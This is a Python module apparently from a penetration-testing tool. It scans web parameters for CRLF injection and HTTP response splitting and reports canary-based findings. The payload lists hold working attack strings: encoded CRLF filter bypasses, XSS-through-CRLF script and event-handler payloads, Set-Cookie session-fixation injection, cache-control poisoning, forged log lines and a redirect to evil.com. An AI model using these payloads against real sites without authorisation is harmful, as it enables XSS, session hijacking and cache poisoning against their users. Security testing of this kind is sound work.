"""
Jarwis AGI Pen Test - CRLF Injection / HTTP Response Splitting Scanner
Detects CRLF Injection and HTTP Response Splitting vulnerabilities (A03:2021 - Injection)

Based on PortSwigger Web Security Academy and OWASP Testing Guide

Attack Techniques:
- CRLF injection in HTTP headers
- HTTP Response Splitting
- Header injection for XSS
- Log injection/poisoning
- Session fixation via Set-Cookie injection
- Cache poisoning via response splitting

CRLF injection occurs when an application includes user-supplied input in HTTP response headers
without proper validation. Attackers can inject carriage return (\r) and line feed (\n) characters
to manipulate response headers or even inject a complete malicious response.

Usage:
    scanner = CRLFInjectionScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager
    )
    findings = await scanner.run(post_login=True)
"""

import asyncio
import logging
import re
import uuid
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import quote, unquote

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from attacks.payloads.manager import PayloadManager, PayloadCategory
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class CRLFInjectionScannerV2(BaseAttackScanner):
    """
    CRLF Injection / HTTP Response Splitting Scanner (MITM-based)
    
    OWASP A03:2021 - Injection
    CWE-93: Improper Neutralization of CRLF Sequences
    CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers
    
    Attack vectors:
    - CRLF in URL parameters
    - CRLF in POST body parameters
    - CRLF in cookies
    - CRLF in custom headers
    - Encoded CRLF bypass attempts
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "crlf_injection"
    attack_type = "crlf_injection"
    owasp_category = "A03:2021"
    cwe_id = "CWE-93"
    
    # Unique marker for detection
    CANARY_HEADER = "X-Jarwis-CRLF-Test"
    CANARY_VALUE = "jarwis_crlf_"
    
    # =====================================================================
    # CRLF Injection Payloads
    # =====================================================================
    
    # Basic CRLF sequences
    CRLF_SEQUENCES = [
        '\r\n',           # Standard CRLF
        '\n',             # LF only (works on some servers)
        '\r',             # CR only (rare)
        '\r\n\r\n',       # Double CRLF (ends headers)
    ]
    
    # URL-encoded CRLF payloads
    ENCODED_PAYLOADS = [
        # Standard URL encoding
        '%0d%0a',
        '%0a',
        '%0d',
        '%0d%0a%0d%0a',
        
        # Double URL encoding
        '%250d%250a',
        '%250a',
        '%250d',
        
        # Unicode encoding
        '%u000d%u000a',
        '%u000a',
        
        # Mixed encoding
        '%0d%0A',
        '%0D%0a',
        
        # UTF-8 encoding
        '%c0%8d%c0%8a',  # Overlong UTF-8
        '%e5%98%8a%e5%98%8d',  # Unicode variation
        
        # HTML entities (for reflection scenarios)
        '&#13;&#10;',
        '&#x0d;&#x0a;',
        
        # Null byte + CRLF (bypass filters)
        '%00%0d%0a',
        
        # Tab + CRLF
        '%09%0d%0a',
        
        # Space encoded variations
        '%20%0d%0a',
    ]
    
    # Header injection payloads (inject custom header)
    HEADER_INJECTION_PAYLOADS = [
        # Simple header injection
        '%0d%0a{header}: {value}',
        '%0a{header}: {value}',
        '%0d%0a%20{header}: {value}',  # With space
        
        # Double CRLF + body injection (response splitting)
        '%0d%0a%0d%0a<html>{canary}</html>',
        '%0d%0a%0d%0a{{"test": "{canary}"}}',
        
        # Cookie injection
        '%0d%0aSet-Cookie: {header}={value}',
        '%0d%0aSet-Cookie: session={value}; Path=/',
        
        # Location header injection (open redirect)
        '%0d%0aLocation: https://evil.com/{canary}',
        
        # Content-Type injection
        '%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert("{canary}")</script>',
        
        # Content-Length injection (response truncation)
        '%0d%0aContent-Length: 0%0d%0a%0d%0a',
        
        # Cache-Control injection
        '%0d%0aCache-Control: public, max-age=31536000',
    ]
    
    # XSS via CRLF payloads
    XSS_CRLF_PAYLOADS = [
        '%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert("{canary}")</script>',
        '%0d%0a%0d%0a<script>alert("{canary}")</script>',
        '%0d%0a%0d%0a<img src=x onerror=alert("{canary}")>',
        '%0d%0a%0d%0a<svg onload=alert("{canary}")>',
    ]
    
    # Log injection payloads
    LOG_INJECTION_PAYLOADS = [
        '%0d%0a[CRITICAL] Fake log entry - {canary}',
        '%0d%0a127.0.0.1 - admin [date] "GET /admin HTTP/1.1" 200 {canary}',
        '%0a[ERROR] Security breach detected: {canary}',
    ]
    
    # Parameters commonly vulnerable to CRLF
    PRIORITY_PARAMS = [
        'url', 'redirect', 'return', 'returnurl', 'return_url', 'goto', 
        'next', 'target', 'dest', 'destination', 'redirect_uri', 'continue',
        'callback', 'path', 'file', 'page', 'view', 'ref', 'referer',
        'location', 'uri', 'link', 'src', 'source', 'forward', 'to',
        'lang', 'language', 'locale', 'site', 'host', 'domain', 'name',
        'id', 'user', 'username', 'email', 'message', 'subject', 'title'
    ]
    
    def __init__(
        self,
        http_client: JarwisHTTPClient,
        request_store: RequestStoreDB,
        checkpoint: Optional[RequestLevelCheckpoint] = None,
        token_manager: Optional[TokenManager] = None,
        config: Optional[Dict[str, Any]] = None
    ):
        super().__init__(http_client, request_store, checkpoint, token_manager, config)
        self._canary = f"{self.CANARY_VALUE}{uuid.uuid4().hex[:8]}"
        
        # Initialize PayloadManager for external payload loading
        self._payload_manager = PayloadManager()
        self._external_payloads_loaded = False
        self._ext_crlf_payloads: List[str] = []
    
    def _load_external_payloads(self) -> None:
        """Lazy-load payloads from external files."""
        if self._external_payloads_loaded:
            return
        
        try:
            self._ext_crlf_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CRLF, subcategory="all", limit=60
            )
            self._external_payloads_loaded = True
            logger.debug(f"Loaded {len(self._ext_crlf_payloads)} CRLF payloads from external files")
        except Exception as e:
            logger.warning(f"Failed to load external CRLF payloads, using embedded: {e}")
    
    def get_payloads(self) -> List[str]:
        """Return encoded CRLF payloads. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Prefer external payloads, fall back to embedded
        if self._ext_crlf_payloads:
            return [p.replace('JARWIS_CRLF_MARKER', self._canary) for p in self._ext_crlf_payloads[:self.max_payloads_per_param]]
        return self.ENCODED_PAYLOADS[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request should be tested for CRLF injection."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters:
            return False
        
        # Prioritize redirect-related parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority = any(p in ' '.join(param_names) for p in self.PRIORITY_PARAMS)
        
        return has_priority or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for CRLF injection vulnerabilities.
        
        Attack methodology:
        1. Get baseline response
        2. Test basic CRLF injection
        3. Test header injection payloads
        4. Test XSS via CRLF
        5. Test encoded bypass variations
        """
        findings = []
        
        # Get baseline
        baseline = await self.send_baseline_request(request)
        if not baseline:
            return findings
        
        # Test each parameter
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            locations = self._get_injection_locations(request, param_name)
            
            for location in locations:
                # 1. Basic CRLF injection (header injection)
                crlf_finding = await self._test_basic_crlf(
                    request, param_name, location, baseline
                )
                if crlf_finding:
                    findings.append(crlf_finding)
                    continue
                
                # 2. Response splitting
                splitting_finding = await self._test_response_splitting(
                    request, param_name, location, baseline
                )
                if splitting_finding:
                    findings.append(splitting_finding)
                    continue
                
                # 3. XSS via CRLF
                xss_finding = await self._test_xss_crlf(
                    request, param_name, location, baseline
                )
                if xss_finding:
                    findings.append(xss_finding)
                    continue
                
                # 4. Cookie injection via CRLF
                cookie_finding = await self._test_cookie_injection(
                    request, param_name, location, baseline
                )
                if cookie_finding:
                    findings.append(cookie_finding)
        
        return findings
    
    def _get_injection_locations(
        self,
        request: StoredRequest,
        param_name: str
    ) -> List[str]:
        """Determine where to inject payloads."""
        locations = []
        
        if '?' in request.url and param_name in request.url:
            locations.append('query')
        
        if request.body and param_name in request.body:
            locations.append('body')
        
        if not locations:
            if request.method.upper() == 'GET':
                locations.append('query')
            else:
                locations.append('body')
        
        return locations
    
    async def _test_basic_crlf(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for basic CRLF injection (custom header injection)."""
        
        header_name = self.CANARY_HEADER
        header_value = self._canary
        
        for crlf in self.ENCODED_PAYLOADS[:8]:
            payload = f"{crlf}{header_name}: {header_value}"
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check if our custom header appears in response headers
            is_vuln, evidence, confidence = self._check_header_injection(
                response, header_name, header_value
            )
            
            if is_vuln:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="high",
                    title=f"CRLF Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to CRLF injection. "
                        f"An attacker can inject arbitrary HTTP headers by including CRLF "
                        f"sequences in the input. This can lead to XSS, session fixation, "
                        f"cache poisoning, or other header-based attacks."
                    ),
                    parameter=param_name
                )
            
            # Also check if header appears in body (reflected CRLF)
            if response.body and header_name in response.body and header_value in response.body:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=f"CRLF payload reflected in response body: {header_name}: {header_value}",
                    confidence="medium",
                    severity="medium",
                    title=f"CRLF Reflection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' reflects CRLF sequences in the response body. "
                        f"While not directly exploitable for header injection, this may indicate "
                        f"improper input handling and could be exploitable in other contexts."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_response_splitting(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for HTTP Response Splitting (injecting complete response)."""
        
        for payload_template in self.HEADER_INJECTION_PAYLOADS[4:6]:  # Double CRLF payloads
            payload = payload_template.format(
                canary=self._canary,
                header=self.CANARY_HEADER,
                value=self._canary
            )
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for injected content in body
            if response.body and self._canary in response.body:
                # Verify it's our injected content, not reflected input
                if '<html>' in payload and '<html>' in response.body:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=f"HTTP Response Splitting: injected HTML body containing {self._canary}",
                        confidence="confirmed",
                        severity="critical",
                        title=f"HTTP Response Splitting in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' allows HTTP Response Splitting. "
                            f"An attacker can inject a complete HTTP response with arbitrary "
                            f"headers and body content. This enables XSS, cache poisoning, "
                            f"and potentially serving malware to users."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    async def _test_xss_crlf(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for XSS via CRLF injection."""
        
        for payload_template in self.XSS_CRLF_PAYLOADS[:3]:
            payload = payload_template.format(canary=self._canary)
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for unencoded script tag in response
            if response.body:
                body = response.body
                if '<script>' in body and self._canary in body:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=f"XSS via CRLF: unencoded <script> tag with {self._canary} in body",
                        confidence="confirmed",
                        severity="high",
                        title=f"XSS via CRLF Injection in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' allows XSS through CRLF injection. "
                            f"By injecting CRLF sequences followed by HTML/JavaScript, an attacker "
                            f"can execute arbitrary scripts in the victim's browser."
                        ),
                        parameter=param_name
                    )
                
                # Check for other XSS vectors
                if ('<img' in body or '<svg' in body) and self._canary in body:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=f"XSS via CRLF: event handler with {self._canary} in body",
                        confidence="high",
                        severity="high",
                        title=f"XSS via CRLF Injection in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' allows XSS through CRLF injection."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    async def _test_cookie_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for cookie injection via CRLF."""
        
        cookie_value = f"jarwis_session_{uuid.uuid4().hex[:8]}"
        
        payloads = [
            f'%0d%0aSet-Cookie: {self.CANARY_HEADER}={cookie_value}',
            f'%0d%0aSet-Cookie: {self.CANARY_HEADER}={cookie_value}; Path=/',
            f'%0aSet-Cookie: {self.CANARY_HEADER}={cookie_value}',
        ]
        
        for payload in payloads:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check if Set-Cookie header was injected
            if response.headers:
                headers_lower = {k.lower(): v for k, v in response.headers.items()}
                set_cookie = headers_lower.get('set-cookie', '')
                
                if self.CANARY_HEADER.lower() in set_cookie.lower() or cookie_value in set_cookie:
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=f"Set-Cookie header injected: {set_cookie[:100]}",
                        confidence="confirmed",
                        severity="high",
                        title=f"Cookie Injection via CRLF in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' allows Set-Cookie header injection "
                            f"through CRLF sequences. An attacker can set arbitrary cookies "
                            f"in the victim's browser, enabling session fixation attacks."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    def _check_header_injection(
        self,
        response: AttackResponse,
        header_name: str,
        header_value: str
    ) -> Tuple[bool, str, str]:
        """Check if custom header was successfully injected."""
        if not response.headers:
            return False, "", ""
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        # Check for our injected header
        if header_name.lower() in headers_lower:
            value = headers_lower[header_name.lower()]
            if header_value in value:
                return True, f"Header injected: {header_name}: {value}", "confirmed"
            else:
                return True, f"Header name found (different value): {header_name}: {value}", "high"
        
        # Check if header appears anywhere in headers (might be combined)
        all_headers = ' '.join(f"{k}: {v}" for k, v in response.headers.items())
        if header_value in all_headers:
            return True, f"Header value found in response headers", "high"
        
        return False, "", ""
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """Analyze response for CRLF injection indicators."""
        
        # Check headers
        is_header_injected, evidence, confidence = self._check_header_injection(
            response, self.CANARY_HEADER, self._canary
        )
        if is_header_injected:
            return True, evidence, confidence
        
        # Check body for reflected content
        if response.body and self._canary in response.body:
            return True, f"Canary {self._canary} found in response body", "medium"
        
        return False, "", ""


# Alias for backward compatibility  
CRLFInjectionScanner = CRLFInjectionScannerV2
HTTPResponseSplittingScanner = CRLFInjectionScannerV2
